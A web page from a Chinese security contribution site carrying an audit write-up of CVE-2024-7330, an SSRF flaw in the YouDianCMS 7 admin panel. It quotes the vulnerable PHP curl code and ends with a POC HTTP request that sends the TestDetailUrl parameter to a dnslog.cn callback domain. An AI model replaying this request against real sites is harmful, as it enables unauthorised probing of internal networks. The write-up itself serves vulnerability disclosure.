
<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="description" content="一个团队使用的贡献平台">
  <meta name="keywords" content="安全,团队,贡献">
  <meta name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <title>【原创】（CVE-2024-7330）YouDianCMS 7 SSRF漏洞 | 安全团队贡献平台</title>

  <link rel="icon" type="image/ico" href="/static/img/main.ico">

  <!-- Set render engine for 360 browser -->
  <meta name="renderer" content="webkit">

  <!-- No Baidu Siteapp-->
  <meta http-equiv="Cache-Control" content="no-siteapp"/>

  <!-- Add to homescreen for Chrome on Android -->
  <meta name="mobile-web-app-capable" content="yes">

  <!-- Add to homescreen for Safari on iOS -->
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">
  <meta name="apple-mobile-web-app-title" content="安全团队贡献平台"/>

  <!-- SEO: If your mobile URL is different from the desktop URL, add a canonical link to the desktop page https://developers.google.com/webmasters/smartphone-sites/feature-phones -->
  <!--
  <link rel="canonical" href="http://www.example.com/">
  -->
  <link rel="stylesheet" href="/static/normalize.css/normalize.min.css">
  <link rel="stylesheet" href="/static/amazeui-2.7.2/dist/css/amazeui.min.css">
  <link rel="stylesheet" href="/static/css/archive.css">
  
  
<link rel="stylesheet" href="/static/css/code.css">

</head>
<body>
<header class="am-topbar am-g am-g-collapse">
<div class="am-container" style="padding-left: 0">
  <div class="am-u-sm-centered">
  <h1 class="am-topbar-brand">
    <a href="#">安全团队贡献平台</a>
  </h1>

  <button class="am-topbar-btn am-topbar-toggle am-btn am-btn-sm am-btn-success am-show-sm-only" data-am-collapse="{target: '#doc-topbar-collapse'}">
      <span class="am-sr-only">导航切换</span> <span class="am-icon-bars"></span>
  </button>

  <div class="am-collapse am-topbar-collapse" id="doc-topbar-collapse">
    <ul class="am-nav am-nav-pills am-topbar-nav">
      <li ><a href="/">首页</a></li>
      <!--<li ><a href="/list/">所有信息</a></li>-->
	  <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          所有信息 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
            <li ><a href="/list/all/">所有情报</a></li>
			<li ><a href="/list/recommend/">推荐专区</a></li>
			<li ><a href="/list/wiki/">综合情报</a></li>
			<li ><a href="/list/userpost/">用户提交</a></li>
			<li ><a href="/list/school/">高校情报</a></li>
        </ul>
      </li>
      <li ><a href="/user/">排行榜</a></li>
      <li ><a href="/gift/">礼品中心</a></li>
	  <li ><a href="/search/">搜索</a></li>
      <li ><a href="/announcements/">公告</a></li>
	  <li ><a href="/ip/">IPwhois<sup>新功能</sup></a></li>
	  <li ><a href="/wooyun/" target="_blank">WooYun drops<sup>新功能</sup></a></li>
      <li class="am-dropdown" data-am-dropdown>
        <a class="am-dropdown-toggle" data-am-dropdown-toggle href="javascript:;">
          更多 <span class="am-icon-caret-down"></span>
        </a>
        <ul class="am-dropdown-content">
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/edudata" target="_blank">edudata平台</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3629/" target="_blank">零组知识库-006应急响应目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3631/" target="_blank">零组知识库-007内网渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3632/" target="_blank">零组知识库-009安全技术目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3633/" target="_blank">零组知识库-010域渗透目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/post/3634/" target="_blank">零组知识库-011运维与二进制安全目录</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/cas/jump/xss" target="_blank">XSS平台</a></li>
            
          
            
                <li><a href="http://data.shikangsi.com/" target="_blank">edusrc数据分析</a></li>
            
          
            
                <li><a href="https://wiki.shikangsi.com/links/" target="_blank">友情链接</a></li>
            
          
            
          
            
          
            
                <li><a href="https://wiki.shikangsi.com/zone/" target="_blank">wiki社区</a></li>
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
            
          
        </ul>
      </li>
    </ul>
	
        
    <div class="am-topbar-right">
      <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/add/">提交贡献</a>
    </div>
	
	<div class="am-topbar-right">
        <a class="am-btn am-btn-primary am-topbar-btn am-btn-sm" href="/login/">登录</a>
    </div>
	<div class="am-topbar-right">
        <a class="am-btn am-btn-secondary am-topbar-btn am-btn-sm" href="/register/">注册</a>
    </div>
	


  </div>
  </div>
</div>
</header>


<div class="am-container">
<div class="am-g">
  <div class="am-u-sm-centered am-u-sm-11">
      <article class="am-article">
          <div class="am-article-hd">
            <h1 class="am-article-title">【原创】（CVE-2024-7330）YouDianCMS 7 SSRF漏洞</h1>
              <hr />
              <button type="button" class="am-btn am-btn-primary btn-copy" data-am-popover="{content: '已复制'}">分享</button>
              <h3>当前为私密分享，无需登录即可查看。</h3>
              <hr />
          </div>

          <table class="am-table am-table-bordered ">
              <tr>
                  <th>时间</th>
                  <th class="am-text-center am-hide-sm-down">作者</th>
				  <th width="8%" class="am-text-center am-hide-sm-down">可见性</th>
                  <th width="8%" class="am-text-center am-hide-sm-down">等级</th>
                  <th class="am-text-center am-hide-sm-down">Rank</th>
              </tr>
              <tr>
              <tr>
                  <td>2024-07-21 23:55:43</td>
                  <td class="am-text-center am-hide-sm-down"><a href="/profile/607/" class="am-link-muted">Mstir</a></td>
				  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-success">公开的</span></td>
                  <td class="am-text-center am-hide-sm-down"><span class="am-badge am-badge-primary">中危</span></td>
                  <td class="am-text-center am-hide-sm-down">0</td>
              </tr>
            </table>

          <div class="am-article-bd">
            <p class="">CVE-2024-7330<br>Created: 07/31/2024 02:19 PM<br>Updated: 08/01/2024 01:20 PM<br>Changes: 07/31/2024 02:19 PM (56), 08/01/2024 03:25 AM (18), 08/01/2024 01:20 PM (1)<br>Submitter: Mstir@Wiki</p>
              <hr>
            <h1>漏洞描述</h1>
<blockquote>
<p>YouDianCMS 是一款内容管理系统，广泛用于网站内容的创建、管理和发布。</p>
</blockquote>
<p>在YouDianCMS后台的<code>/App/Core/Extend/Function/ydLib.php</code>文件中，使用了<code>curl_exec</code>函数去访问<code>$url</code>变量。通过全局搜索调用<code>yd_curl_get</code>函数的文件，发现<code>/App/Lib/Action/Admin/CollectAction.class.php</code>文件中调用了此函数。</p>
<p><code>CollectAction.class.php</code>中的<code>testField</code>方法通过<code>$_POST</code>接收<code>TestDetailUrl</code>参数，并使用<code>curl_exec</code>发起网络请求。由于<code>$url</code>变量未经过严格的验证和过滤，攻击者可以构造恶意的URL，导致SSRF（服务器端请求伪造）漏洞。攻击者可以利用此漏洞发起对内部网络的请求，可能导致敏感信息泄露或对内部网络的进一步攻击。</p>
<h1>审计过程</h1>
<p>问题出自 /App/Core/Extend/Function/ydLib.php 使用了curl_exec函数去访问\$url变量.</p>
<pre class="codehilite"><code class="language-php">function yd_curl_get($url, $data=false, $timeout = 5, $options=array() ){
  //http_build_query(array(&#039;foo&#039;=&gt;&#039;bar&#039;,&#039;baz&#039;=&gt;&#039;boom&#039;)); 输出：foo=bar&baz=boom
  if(!empty($data)){
    $url .= &#039;?&#039;.http_build_query($data);
  }
  if( function_exists(&#039;curl_init&#039;) ){
    $ch = curl_init( $url );
    //症状：php curl调用https出错 排查方法：在命令行中使用curl调用试试。
    //原因：服务器所在机房无法验证SSL证书。解决办法：跳过SSL证书检查。
    //不加上CURLOPT_SSL_VERIFYPEER，curl_exec总是返回false
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
    //curl_setopt($ch, CURLOPT_HTTPHEADER, array(&#039;X-FORWARDED-FOR:220.181.136.242&#039;, &#039;CLIENT-IP:220.181.136.242&#039;));
    //CURLOPT_REFERER、CURLOPT_USERAGENT
    foreach ($options as $k=&gt;$v){
      $k = is_numeric($k) ? $k : constant($k);
      curl_setopt($ch, $k, $v);
    }
    $res = curl_exec($ch);
    curl_close($ch);
  }else{
    //利用了stream_context_create()设置超时时间:
    //当读取https协议时，需要服务器支持open_ssl模块
    $opts = array( &#039;http&#039; =&gt; array(&#039;timeout&#039; =&gt; $timeout, &#039;method&#039;=&gt;&quot;GET&quot;, &#039;header&#039;=&gt;&#039;&#039;) );
    if( $options[&#039;CURLOPT_REFERER&#039;]){
      $opts[&#039;header&#039;] .= &quot;Referer:&quot;.$options[&#039;CURLOPT_REFERER&#039;].&quot;\r\n&quot;;
    }
    if( $options[&#039;CURLOPT_USERAGENT&#039;]){
      $opts[&#039;header&#039;] .= &quot;User-Agent:&quot;.$options[&#039;CURLOPT_USERAGENT&#039;].&quot;\r\n&quot;;
    }
    $context = stream_context_create( $opts );
    $res = @file_get_contents( $url, false, $context );
  }
  return $res;
}
</code></pre>

<p>调用该方法的程序: /App/Lib/Action/Admin/CollectAction.class.php</p>
<pre class="codehilite"><code class="language-php">public function testField()
    {
        header(&quot;Content-Type:text/html; charset=utf-8&quot;);
        $url = trim($_POST[&quot;TestDetailUrl&quot;]);

        if (empty($url)) {
            if (empty($_POST[&quot;DetailUrlRegex&quot;])) {
                $url = $_POST[&quot;ListUrl&quot;];
            }
            else {
                $result = $this-&gt;_collectList($_POST);

                if (is_array($result)) {
                    $index = rand(0, count($result) - 1);
                    $url = $result[$index];
                }
                else {
                    $this-&gt;ajaxReturn($result, &quot;&quot;, 0);
                }
            }
        }

        $data = $this-&gt;_collectContent($url, $_POST[&quot;FieldInfo&quot;], $_POST[&quot;ReplacePara&quot;], $_POST);

        if (is_array($data)) {
            $this-&gt;ajaxReturn($data, $url, 1);
        }
        else {
            $this-&gt;ajaxReturn($data, $url, 0);
        }
    }
</code></pre>

<h1>POC</h1>
<pre class="codehilite"><code class="language-http">POST /index.php/Admin/Collect/testField HTTP/1.1
Host: [目标域名]
Content-Type: application/x-www-form-urlencoded
Cookie: [目标Cookie]
Content-Length: 30

TestDetailUrl=xxx.dnslog.cn
</code></pre>
          </div>

          


      </article>

      <hr>
      <section class="am-panel am-panel-default">
          <div class="am-panel-bd am-text-sm">
            审核评价： 没有任何评价...
          </div>
        </section>

  </div>
</div>
</div>
<div class="main-footer" style="margin:5% 0 auto;text-align:center;">
    2014-2022 © 联系邮箱：<a href="mailto:admin@sg95.cn">admin@sg95.cn</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://beian.miit.gov.cn">鄂ICP备15020128号-4</a><br>
</div>


<!--<footer class="footer" id="footer">

</footer>
-->
<script src="/static/jquery-3.3.1/dist/jquery.min.js"></script>
<script src="/static/amazeui-2.7.2/dist/js/amazeui.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.newsTicker.min.js"></script>
<script type="text/javascript" src="/js/"></script>
<script>
    const input = document.getElementById('keyword');

    $(document).on('input keypress', function(event) {
    const value = input.value;
    console.log(value); // 获取并处理输入值
    if(event.keyCode==13){
        event.preventDefault();
        event.stopPropagation();
        var url=window.location.origin+'/search/'+value;
        console.log(url);
        window.location.href=url;
    }
});
$("#searchBtn").click(function(){
var url=window.location.origin+'/search/'+$("#keyword").val();
console.log(url);
window.location.href=url;
});
$("#ipwhois").click(function(){
var url=window.location.origin+'/ip/'+$("#ip").val();
console.log(url);
window.location.href=url;
});
</script>

<script src="/static/js/archive.js"></script>
<script src="/static/clipboardjs-2.0.10/clipboard.min.js"></script>
<script type="text/javascript">
function escape(txt) {
    return txt && txt.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/'/g, '&#39;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}
function reply(id, touser) {
    $("#id_parent").val(id);
    touser = escape('回复 “ ' + touser + ' ”');
    touser = $('<div class="am-alert am-text-sm" id="my-alert" data-am-alert><button type="button" class="am-close">&times;</button><p>'+touser+'</p></div>')
    $('#reply-box').html(touser);
    $('#my-alert').on('closed.alert.amui', function() {
      $("#id_parent").val('');
    });
}
//修改超链接地址
$(document).ready(function(){
if($('.am-article-bd').html().indexOf('http:///article')!==-1){
$('a').each(function(){
var url=$(this).attr('href');
var localURL=window.location.origin;
url=url.replace("http://",localURL);
$(this).attr('href',url);
})
}
else{
console.log('该页面无需替换。');
}
});
</script>

</body>
</html>